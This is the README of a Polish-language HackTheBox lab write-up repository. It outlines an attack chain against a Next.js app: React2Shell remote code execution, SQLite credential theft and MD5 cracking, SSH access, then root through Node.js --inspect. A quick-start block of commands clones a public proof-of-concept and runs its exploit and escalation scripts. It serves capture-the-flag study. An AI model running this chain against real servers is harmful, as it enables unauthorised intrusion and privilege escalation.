# ReactorWatch — HackTheBox (Linux)

Next.js **React2Shell** (CVE-2025-55182 / CVE-2025-66478) → SQLite creds → **engineer** → root przez **Node.js --inspect** (bez LXD/snap).

| Ścieżka | Zawartość |
|---------|-----------|
| [`WRITEUP.md`](WRITEUP.md) | Pełny łańcuch + flagi (lab) |
| [`edu/`](edu/) | Nauka krok po kroku |
| [`scripts/`](scripts/) | Własne skrypty (PoC: [freeqaz/react2shell](https://github.com/freeqaz/react2shell)) |
| [`ACCESS.md`](ACCESS.md) | Co działa / czego nie szukać |

## Szybki start

```bash
git clone https://github.com/freeqaz/react2shell.git
cd react2shell && chmod +x *.sh
./detect.sh http://<IP>:3000/
./exploit-redirect.sh http://<IP>:3000/ 'id'

# user: crack MD5 engineer z reactor.db → SSH
ssh engineer@<IP>

# root (cicho):
python3 scripts/root-inspect-cdp.py
```

Skopiuj `secrets.example.env` → `secrets.env` (lokalnie, nie commituj).
